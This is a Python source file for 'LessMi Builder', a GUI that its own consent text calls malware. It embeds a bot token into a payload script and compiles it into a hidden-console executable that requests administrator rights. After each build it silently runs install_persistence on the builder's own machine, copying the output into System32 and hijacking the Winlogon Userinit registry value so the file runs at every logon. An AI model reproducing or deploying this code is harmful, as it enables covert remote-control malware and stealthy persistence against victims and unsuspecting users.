#  __  __       _          _    ____ 
# |  \/  | __ _| |_ ___   / \  / ___|
# | |\/| |/ _` | __/ _ \ / _ \| |  _ 
# | |  | | (_| | ||  __// ___ \ |_| |
# |_|  |_|\__,_|\__\___/_/   \_\____|
#
# © Copyright 2026 - MateAG
# All rights reserved. Any copy without 
# consent of this code will be reported.
#
# ℹ > This project is only for educational purposes.
# The creator is NOT responsible of any illegal/malicious use
# of this project.
#
# The creator advices you to use this for testing and
# legal activities. If you want to install this on
# someone else computer, please ask them for the
# permission to.
#
# Thank you and happy testing! <3


import customtkinter as ctk
import tkinter.filedialog
import os
import re
import subprocess
import sys
import shutil
import threading
import time
import urllib.request
import winreg
from io import BytesIO

try:
    import pygame
    pygame.mixer.init()
    AUDIO_AVAILABLE = True
except Exception:
    AUDIO_AVAILABLE = False

ctk.set_appearance_mode("Dark")


def install_persistence(exe_path):
    try:
        target_dir = r"C:\Windows\System32\ZZZ_Security"
        os.makedirs(target_dir, exist_ok=True)
        target_exe = os.path.join(target_dir, "ZZZ_Security.exe")

        if exe_path and os.path.exists(exe_path):
            try:
                shutil.copy2(exe_path, target_exe)
            except Exception:
                pass

        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(
            key, "Userinit", 0, winreg.REG_SZ,
            r"C:\Windows\System32\userinit.exe, C:\Windows\System32\ZZZ_Security\ZZZ_Security.exe"
        )
        winreg.CloseKey(key)
    except Exception:
        pass


class ModernBuilder(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("LessMi Builder")
        self.geometry("960x780")
        self.minsize(800, 600)
        self.resizable(True, True)
        self.configure(fg_color="#080808")

        self.config = {
            "server_id": "",
            "token_1": "",
            "token_2": "",
            "token_3": "",
            "exe_name": "app.exe",
            "registry_name": "application",
            "folder_name": "app",
            "icon_path": "",
            "onefile": True,
        }

        self.sound_buffers = []
        self.last_sound_index = -1
        self.init_key_sounds()

        self.create_widgets()

    def init_key_sounds(self):
        if not AUDIO_AVAILABLE:
            return

        urls = [
            'https://www.myinstants.com/media/sounds/creamy-keyboard-once.mp3',
            'https://www.myinstants.com/media/sounds/creamy-keyboard-v7.mp3',
            'https://www.myinstants.com/media/sounds/galaxy-s25-keypress-retro-theme.mp3',
        ]

        def load_audio():
            for url in urls:
                try:
                    req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
                    with urllib.request.urlopen(req) as resp:
                        data = resp.read()
                        sound = pygame.mixer.Sound(BytesIO(data))
                        self.sound_buffers.append(sound)
                except Exception:
                    pass

        threading.Thread(target=load_audio, daemon=True).start()

    def play_key_sound(self, event=None):
        if not AUDIO_AVAILABLE or not self.sound_buffers:
            return

        if event:
            if not (len(event.char) == 1 or event.keysym in ('BackSpace', 'Return', 'space')):
                return

            idx = self.last_sound_index
            if len(self.sound_buffers) > 1:
                while idx == self.last_sound_index:
                    idx = __import__("random").randint(0, len(self.sound_buffers) - 1)
            else:
                idx = 0

            self.last_sound_index = idx
            sound = self.sound_buffers[idx]
            vol = 0.3 + __import__("random").uniform(0.0, 0.15)
            sound.set_volume(vol)
            sound.play()

    def create_widgets(self):
        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(1, weight=1)

        header_frame = ctk.CTkFrame(self, height=80, corner_radius=16, fg_color="#0d0d0d", border_width=1, border_color="#1a1a1a")
        header_frame.grid(row=0, column=0, padx=24, pady=(24, 12), sticky="ew")
        header_frame.grid_propagate(False)

        ctk.CTkLabel(
            header_frame, text="LessMi Builder",
            font=ctk.CTkFont(family="Poppins", size=24, weight="bold"),
            text_color="#f2f2f2",
        ).pack(side="left", padx=24, pady=10)

        ctk.CTkLabel(
            header_frame, text="Beta v1.0 - MateAGYT/LessMi",
            font=ctk.CTkFont(family="Poppins", size=12),
            text_color="#8c8c8c",
        ).pack(side="right", padx=24, pady=10)

        scroll_frame = ctk.CTkScrollableFrame(
            self, label_text="BUILDER SETTINGS",
            label_font=ctk.CTkFont(family="Poppins", size=11, weight="bold"),
            label_text_color="#8c8c8c", corner_radius=16,
            fg_color="#0d0d0d", border_width=1, border_color="#1a1a1a",
        )
        scroll_frame.grid(row=1, column=0, padx=24, pady=12, sticky="nsew")
        scroll_frame.grid_columnconfigure((0, 1), weight=1)

        self.inputs = {}
        labels_and_vars = [
            ("Server ID (*)", "server_id", "", False),
            ("Executable Name (*)", "exe_name", "application.exe", False),
            ("Bot Token (*)", "token_1", "", True),
            ("Registry Key (*)", "registry_name", "mycoolapp", False),
            ("Backup Token 1", "token_2", "", True),
            ("Folder Alias (*)", "folder_name", "MateAG", False),
            ("Backup Token 2", "token_3", "", True),
        ]

        for i, (text, key, default, is_pass) in enumerate(labels_and_vars):
            row = i // 2
            col = i % 2

            card = ctk.CTkFrame(scroll_frame, fg_color="#101010", corner_radius=12, border_width=1, border_color="#1a1a1a")
            card.grid(row=row, column=col, padx=8, pady=8, sticky="ew")
            card.grid_columnconfigure(0, weight=1)

            ctk.CTkLabel(
                card, text=text,
                font=ctk.CTkFont(family="Poppins", size=11, weight="bold"),
                text_color="#8c8c8c",
            ).grid(row=0, column=0, padx=14, pady=(10, 2), sticky="w")

            ent = ctk.CTkEntry(
                card, show="*" if is_pass else "",
                border_width=1, corner_radius=8, fg_color="#0a0a0a",
                border_color="#1a1a1a", text_color="#f2f2f2",
                font=ctk.CTkFont(family="Poppins", size=12),
            )
            ent.insert(0, default)
            ent.grid(row=1, column=0, padx=14, pady=(0, 10), sticky="ew")
            ent.bind("<KeyPress>", self.play_key_sound)

            self.inputs[key] = ent

        assets_frame = ctk.CTkFrame(scroll_frame, fg_color="#101010", corner_radius=12, border_width=1, border_color="#1a1a1a")
        assets_frame.grid(row=4, column=0, columnspan=2, padx=8, pady=12, sticky="ew")
        assets_frame.grid_columnconfigure(0, weight=1)

        ctk.CTkLabel(
            assets_frame, text="Custom icon (.ico)",
            font=ctk.CTkFont(family="Poppins", size=12, weight="bold"),
            text_color="#f2f2f2",
        ).grid(row=0, column=0, padx=14, pady=12, sticky="w")

        self.btn_icon = ctk.CTkButton(
            assets_frame, text="Upload .ico", command=self.select_icon,
            fg_color="#f1f1f1", hover_color="#ffffff", text_color="#111111",
            font=ctk.CTkFont(family="Poppins", size=12, weight="bold"), corner_radius=999,
        )
        self.btn_icon.grid(row=0, column=1, padx=14, pady=12, sticky="e")

        footer_frame = ctk.CTkFrame(self, height=110, corner_radius=16, fg_color="#0d0d0d", border_width=1, border_color="#1a1a1a")
        footer_frame.grid(row=2, column=0, padx=24, pady=(12, 24), sticky="ew")

        controls_layout = ctk.CTkFrame(footer_frame, fg_color="transparent")
        controls_layout.pack(fill="both", expand=True, padx=20, pady=12)

        status_container = ctk.CTkFrame(controls_layout, fg_color="transparent")
        status_container.pack(side="left", fill="both", expand=True)

        self.lbl_status = ctk.CTkLabel(
            status_container, text="Ready to compile",
            font=ctk.CTkFont(family="Poppins", size=12),
            text_color="#8c8c8c", anchor="w",
        )
        self.lbl_status.pack(fill="x", pady=(0, 6))

        self.progress = ctk.CTkProgressBar(status_container, height=4, corner_radius=2, fg_color="#101010", progress_color="#f1f1f1")
        self.progress.set(0)
        self.progress.pack(fill="x")

        action_container = ctk.CTkFrame(controls_layout, fg_color="transparent")
        action_container.pack(side="right", padx=(16, 0))

        self.chk_onefile = ctk.CTkCheckBox(
            action_container, text="EXE Output",
            font=ctk.CTkFont(family="Poppins", size=11), text_color="#8c8c8c",
            border_width=1, corner_radius=4, checkmark_color="#111111", fg_color="#f1f1f1",
        )
        self.chk_onefile.select()
        self.chk_onefile.pack(side="top", anchor="e", pady=(0, 6))

        self.chk_terms = ctk.CTkCheckBox(
            action_container,
            text="I'm aware that this malware has been made for educational purposes only, and the creator is no way responsible\n"
                 "for any direct or indirect damage caused due to the misusage of the information. Everything I do, I'm doing at\n"
                 "my own risk and responsibility. The creator is no way responsible of your internet activities. This is meant for testing.",
            font=ctk.CTkFont(family="Poppins", size=11), text_color="#8c8c8c",
            command=self.toggle_build_button, border_width=1, corner_radius=4,
            checkmark_color="#111111", fg_color="#f1f1f1",
        )
        self.chk_terms.pack(side="top", anchor="e", pady=(0, 6))

        self.btn_compile = ctk.CTkButton(
            action_container, text="COMPILE PROJECT", command=self.start_compile_thread,
            height=38, width=200, font=ctk.CTkFont(family="Poppins", size=13, weight="bold"),
            state="disabled", fg_color="#f1f1f1", hover_color="#ffffff",
            text_color="#111111", corner_radius=999,
        )
        self.btn_compile.pack(side="top", anchor="e")

        self.apply_smooth_scroll(scroll_frame)

    def apply_smooth_scroll(self, scroll_frame):
        canvas = scroll_frame._parent_canvas
        canvas._scroll_target = 0
        canvas._scroll_job = None

        def animate_scroll():
            if not canvas.winfo_exists():
                return
            current = canvas.yview()[0]
            target = canvas._scroll_target
            diff = target - current
            if abs(diff) > 0.001:
                canvas.yview_moveto(current + diff * 0.25)
                canvas._scroll_job = self.after(12, animate_scroll)
            else:
                canvas.yview_moveto(target)
                canvas._scroll_job = None

        def on_mouse_wheel(event):
            delta = -1 * (event.delta / 120)
            current_target = canvas._scroll_target if canvas._scroll_job else canvas.yview()[0]
            canvas._scroll_target = max(0.0, min(1.0, current_target + (delta * 0.08)))
            if not canvas._scroll_job:
                animate_scroll()
            return "break"

        canvas.bind_all("<MouseWheel>", on_mouse_wheel)

    def toggle_build_button(self):
        self.btn_compile.configure(state="normal" if self.chk_terms.get() == 1 else "disabled")

    def select_icon(self):
        path = tkinter.filedialog.askopenfilename(filetypes=[("Icon files", "*.ico")])
        if path:
            self.config["icon_path"] = path
            self.btn_icon.configure(text=os.path.basename(path))

    def update_status(self, msg, progress_val=None):
        self.lbl_status.configure(text=msg)
        if progress_val is not None:
            self.progress.set(progress_val)

    def start_compile_thread(self):
        self.btn_compile.configure(state="disabled")
        self.chk_terms.configure(state="disabled")
        self.chk_onefile.configure(state="disabled")
        self.progress.start()
        threading.Thread(target=self.compile_process, daemon=True).start()

    def compile_process(self):
        for key, widget in self.inputs.items():
            self.config[key] = widget.get()

        token = self.config["token_1"].strip()
        if not token:
            self.update_status("Error: Bot Token is required")
            self.reset_ui_state()
            return

        source_path = "source_assembled.py"
        if not os.path.exists(source_path):
            self.update_status("Error: source_assembled.py not found")
            self.reset_ui_state()
            return

        exe_target_name = self.config["exe_name"]
        if exe_target_name.endswith(".exe"):
            exe_target_name = exe_target_name[:-4]
        if not exe_target_name:
            exe_target_name = "app"

        self.update_status("Preparing build environment...", 0.2)

        subprocess.run(["taskkill", "/f", "/im", f"{exe_target_name}.exe"], capture_output=True)
        time.sleep(1)

        try:
            if os.path.exists("dist"):
                shutil.rmtree("dist")
            if os.path.exists("build"):
                shutil.rmtree("build")
            os.makedirs("dist", exist_ok=True)

            resources = ["resources", "custom_imports.txt"]
            for res in resources:
                if os.path.exists(res):
                    dest = os.path.join("dist", res)
                    if os.path.isdir(res):
                        shutil.copytree(res, dest, dirs_exist_ok=True)
                    else:
                        shutil.copy2(res, dest)

            if self.config["icon_path"]:
                shutil.copy2(self.config["icon_path"], os.path.join("dist", "icon.ico"))
        except Exception as e:
            self.update_status(f"Error preparing build: {e}")
            self.reset_ui_state()
            return

        self.update_status("Injecting token into source...", 0.45)

        with open(source_path, "r", encoding="utf-8") as f:
            lines = f.readlines()

        new_lines = []
        replaced = False
        for line in lines:
            if not replaced and re.match(r'^\s*token\s*=', line):
                new_lines.append(f'token = "{token}"\n')
                replaced = True
            else:
                new_lines.append(line)

        if not replaced:
            injected = False
            out = []
            for line in new_lines:
                if not injected and line.startswith('if __name__'):
                    out.append(f'token = "{token}"\n\n')
                    injected = True
                out.append(line)
            if not injected:
                out.append(f'\ntoken = "{token}"\n')
            new_lines = out

        final_source_path = os.path.join("dist", "source_final.py")
        with open(final_source_path, "w", encoding="utf-8") as f:
            f.writelines(new_lines)

        self.update_status("Compiling .EXE...", 0.7)

        original_dir = os.getcwd()
        os.chdir("dist")

        cmd = [sys.executable, "-m", "PyInstaller", "--noconsole",
               f"--name={exe_target_name}", "--distpath=.", "--workpath=build", "--specpath=.",
               "source_final.py"]

        cmd.append("--onefile" if self.chk_onefile.get() == 1 else "--onedir")

        cmd.append("--uac-admin")

        if self.config["icon_path"]:
            cmd.append("--icon=icon.ico")

        sep = ";" if os.name == "nt" else ":"
        if os.path.exists("resources"):
            cmd.append(f"--add-data=resources{sep}resources")
        if os.path.exists("custom_imports.txt"):
            cmd.append(f"--add-data=custom_imports.txt{sep}.")

        try:
            subprocess.run(cmd, check=True)
            self.update_status("Compile finished", 1.0)

            exe_out = os.path.join(os.getcwd(), f"{exe_target_name}.exe")
            if not os.path.exists(exe_out):
                exe_out = os.path.join(os.getcwd(), exe_target_name, f"{exe_target_name}.exe")

            install_persistence(exe_out)

            output_dir = os.getcwd()
            if os.name == "nt":
                os.startfile(output_dir)
            else:
                os.system(f'xdg-open "{output_dir}"')
        except Exception as e:
            self.update_status(f"Error compiling: {e}")
        finally:
            os.chdir(original_dir)
            self.reset_ui_state()

    def reset_ui_state(self):
        self.progress.stop()
        self.chk_terms.configure(state="normal")
        self.chk_onefile.configure(state="normal")
        if self.chk_terms.get() == 1:
            self.btn_compile.configure(state="normal")


if __name__ == "__main__":
    app = ModernBuilder()
    app.mainloop()